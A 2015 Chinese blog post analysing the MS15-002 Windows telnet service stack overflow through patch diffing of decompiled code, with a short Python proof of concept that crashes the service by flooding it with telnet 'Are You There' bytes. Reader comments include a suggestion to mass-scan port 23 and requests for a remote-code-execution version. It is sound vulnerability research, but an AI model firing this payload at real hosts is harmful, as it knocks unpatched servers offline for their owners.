<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">MS15-002 telnet服务缓冲区溢出漏洞分析与POC构造</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">cssembly</a> <span class="bull">·</span> <time title="2015/01/16 9:09" ui-time="" datetime="2015/01/16 9:09" class="published ng-binding ng-isolate-scope">2015/01/16 9:09</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 漏洞原理分析</h1><hr><p>MS15-002是微软telnet服务中的缓冲区溢出漏洞，下面对其原理进行分析并构造POC。</p><p>telnet服务进程为tlntsvr.exe，针对每一个客户端连接会相应启动执行一个tlntsess.exe进程，补丁修补的是tlntsess.exe文件，通过补丁比对，确定漏洞位置如下，函数为</p><pre><code>#!c++
signed int __thiscall CRFCProtocol::ProcessDataReceivedOnSocket(CRFCProtocol *this, unsigned __int32 *a2)
</code></pre><p><img alt="enter image description here" img-src="7e5801225f09f4350f1753b6f8687befc40a40da.jpg"></p><p>补丁前，该函数分别为：</p><p><img alt="enter image description here" img-src="1d444341362e5adb006955897554870b36e23fdf.jpg"></p><p>补丁后，该函数为：</p><p><img alt="enter image description here" img-src="00151677b8008cc60f07d8c687c75b28bdd2d4d5.jpg"></p><p>也就是说原来一个缓冲区变成了两个，调用完</p><pre><code>#!c++
(*(void (__thiscall **)(CRFCProtocol *, unsigned __int8 **, unsigned __int8 **, unsigned __int8))((char *)&amp;off_1011008 + v12))(v2,&amp;v13,&amp;v9,v6)
</code></pre><p>之后，先对缓冲区中的数据长度进行判断，如果</p><pre><code>#!c++
(unsigned int)(v9 - (unsigned __int8 *)&amp;Src - 1) &lt;= 0x7FE 
</code></pre><p>则判断目标缓冲区中可容纳字符的个数，如果</p><pre><code>#!c++
(unsigned int)((char *)v14 + v7 - (_DWORD)&amp;Dst) &gt;= 0x800
</code></pre><p>则退出，否则执行</p><pre><code>#!c++
memcpy_s(v14, (char *)&amp;v18 - (_BYTE *)v14, &amp;Src, v9 - (unsigned __int8 *)&amp;Src)
</code></pre><p>将数据拷贝到Dst缓冲区。</p><p>而补丁前，只有一个缓冲区，调用</p><pre><code>#!c++
(*(&amp;off_1011008 + 3 * v7))(v3, &amp;v14, &amp;v13, *v6)
</code></pre><p>之前，先对缓冲区中的数据长度进行判定，只有当v13 - &amp;Src &lt;= 2048时才调用，v13 指向可用的缓冲区头部，而</p><pre><code>#!c++
(*(&amp;off_1011008 + 3 * v7))(v3, &amp;v14, &amp;v13, *v6)
</code></pre><p>处调用的函数，会对v13的值进行修改，如果调用</p><pre><code>#!c++
void __thiscall CRFCProtocol::DoTxBinary(CRFCProtocol *this, unsigned __int8 **a2, unsigned __int8 **a3, unsigned __int8 a4)
</code></pre><p>函数，可以看到函数修改了参数3的值，即*a3 += 3。</p><p><img alt="enter image description here" img-src="431a86ea4ad644e0d16afd8e78ca4a413bfeac44.jpg"></p><p>经过分析可以知道，如果v13 - &amp;Src =2047，则满足v13 - &amp;Src &lt;= 2048条件，此时如果(*(&amp;off_1011008 + 3 * v7))(v3, &amp;v14, &amp;v13, *v6)调用的是CRFCProtocol::DoTxBinary函数，且执行到了如下指令序列时，显然导致了缓冲区溢出。</p><pre><code>#!c++
v7 = *a3;
*v7 = -1;
v7[1] = -3;
v7[2] = a4;
v7[3] = 0;
*a3 += 3;
</code></pre><p>补丁后的版本，采用两个缓冲区，将临时缓冲区指针v9传递给</p><pre><code>#!c++
(*(void (__thiscall **)(CRFCProtocol *, unsigned __int8 **, unsigned __int8 **, unsigned __int8))((char *)&amp;off_1011008 + v12))(v2,&amp;v13,&amp;v9,v6)
</code></pre><p>函数返回后判断v9指向的缓冲区中的数据长度，最后判断目的缓冲区剩余可用空间是否可以容纳v9指向的缓冲区中的数据，即对(unsigned int)((char *)v14 + v7 - (_DWORD)&amp;Dst) >= 0x800的判断。</p><h1>0x01 环境搭建与POC构造</h1><hr><p>Win7上安装并启动telnet服务端，执行net user exp 123456 /ADD增加用户exp，通过net localgroup TelnetClients exp /ADD将该用户添加至TelnetClients组，这样就能够通过telnet客户端进行登录了。</p><p>调试发现</p><pre><code>#!c++
signed int __thiscall CRFCProtocol::ProcessDataReceivedOnSocket(CRFCProtocol *this, unsigned __int32 *a2)
</code></pre><p>中<em>a2为接收到的数据的长度，最大为0x400，v6指向接收到的数据，显然为了触发溢出，必须在调用(</em>(&amp;off_1011008 + 3 * v7))(v3, &amp;v14, &amp;v13, *v6)时，让数据出现膨胀，保证处理过后的Src缓冲区中的数据长度大于0x800。</p><p><img alt="enter image description here" img-src="9052e7975fad71376f409d5c76ecc0334e08d06a.jpg"></p><p>查看(*(&amp;off_1011008 + 3 * v7))(v3, &amp;v14, &amp;v13, *v6)处可以调用的函数，</p><pre><code>#!c++
void __thiscall CRFCProtocol::AreYouThere(CRFCProtocol *this, unsigned __int8 **a2, unsigned __int8 **a3, unsigned __int8 a4)
</code></pre><p>显然会导致数据膨胀，a4是接收到的数据中的一个字节，执行后，a3指向的缓冲区中将写入9字节的固定数据。</p><p><img alt="enter image description here" img-src="1d444341362e5adb006955897554870b36e23fdf.jpg"></p><p>通过wireshark截包，简单对协议进行分析，构造POC如下，让程序多次执行CRFCProtocol::AreYouThere函数，最终触发异常。</p><pre><code>#!python
import socket  
address = ('192.168.172.152', 23)  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect(address)
data = "\xff\xf6" * 0x200
s.send(data) 
s.recv(512)  
s.close()
</code></pre><p>运行poc，在</p><pre><code>#!c++
signed int __thiscall CRFCProtocol::ProcessDataReceivedOnSocket( CRFCProtocol *this, unsigned __int32 *a2)
</code></pre><p>处设置断点，中断后可以看到<em>a2 = 0x400，</em>(DWORD<em>)(</em>(DWORD*)(this+0x1E40)+ 0x16c8)指向接收到得数据。</p><p><img alt="enter image description here" img-src="e2029370dfa78b48ee39ff1025f6519d97ecfb11.jpg"></p><p>在函数返回前设置断点，执行之后，可以看到_&#95;security&#95;check_cookie检测到了栈溢出，触发了异常，中断到调试器。</p><p><img alt="enter image description here" img-src="166fac2d33f4417f8371530776295957996baf11.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/5731" rel="bookmark" id="re1">MS15-035 EMF文件处理漏洞分析与POC构造</a></li><li><a href="http://drops.wooyun.org/papers/7816" rel="bookmark" id="re2">分析及防护：Win10执行流保护绕过问题</a></li><li><a href="http://drops.wooyun.org/papers/5669" rel="bookmark" id="re3">MS15-034/CVE-2015-1635 HTTP.SYS 漏洞分析</a></li><li><a href="http://drops.wooyun.org/tips/3589" rel="bookmark" id="re4">教你解密Gh0st 1.0远控木马VIP版配置信息</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">walkerfuz</span> <span class="reply-time">2015-01-27 19:51:09</span></div><p></p><p>@ cssembly大神，根据您的分析，在有问题的函数里，只是向栈中写入过多的无用填充字节（可能4字节中有一个字节可以是发送过来的数据），感觉没有RCE的可能性，但官网上标记该漏洞为RCE，求解惑</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x12</span> <span class="reply-time">2015-01-21 04:17:55</span></div><p></p><p>后排留名嗑瓜子</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">HelloWord</span> <span class="reply-time">2015-01-20 16:32:58</span></div><p></p><p>似乎。。。好像。。。也许。。。只是覆盖了 securitycookie 和后面的1个字节，真的可以用来 RCE 吗，我什么都不懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">RickGray</span> <span class="reply-time">2015-01-18 17:04:56</span></div><p></p><p>可以zmap port 23了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DrKNa</span> <span class="reply-time">2015-01-17 23:00:27</span></div><p></p><p>如果是windows核心元件的话可以使用Debug版windows来调试的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">刘海哥</span> <span class="reply-time">2015-01-17 15:45:03</span></div><p></p><p>我的大刀以饥渴能耐！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Startz007</span> <span class="reply-time">2015-01-16 22:10:55</span></div><p></p><p>楼主厉害,数度真快。<br>请教一下由于是服务启动的，楼主是怎么调试的.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">FatmanFromPalazoeul</span> <span class="reply-time">2015-01-16 21:02:40</span></div><p></p><p>per me e&#039; cinese!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dpanda</span> <span class="reply-time">2015-01-16 17:47:53</span></div><p></p><p>分析速度真是快啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">昵称</span> <span class="reply-time">2015-01-16 16:25:19</span></div><p></p><p>求Remote Code Execution姿势~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大白菜</span> <span class="reply-time">2015-01-16 16:17:13</span></div><p></p><p>核总人家给出可以异常POC了。。你写一个可以执行的POC呗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">核攻击</span> <span class="reply-time">2015-01-16 16:14:48</span></div><p></p><p>吊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大白菜</span> <span class="reply-time">2015-01-16 16:02:05</span></div><p></p><p>...然后呢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夜未央</span> <span class="reply-time">2015-01-16 15:39:59</span></div><p></p><p>膜拜大牛！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">胡小树</span> <span class="reply-time">2015-01-16 14:15:36</span></div><p></p><p>什么情况，可以直接Telnet溢出拿shell？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mody</span> <span class="reply-time">2015-01-16 13:33:46</span></div><p></p><p>哎，web狗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0CC</span> <span class="reply-time">2015-01-16 11:47:06</span></div><p></p><p>虽然没大看懂 但是隐隐约约感觉到了牛逼！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-01-16 11:44:33</span></div><p></p><p>啪啪啪</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sai</span> <span class="reply-time">2015-01-16 09:42:57</span></div><p></p><p>沙发，好高端</p><p></p></div></div></div></div></div></main>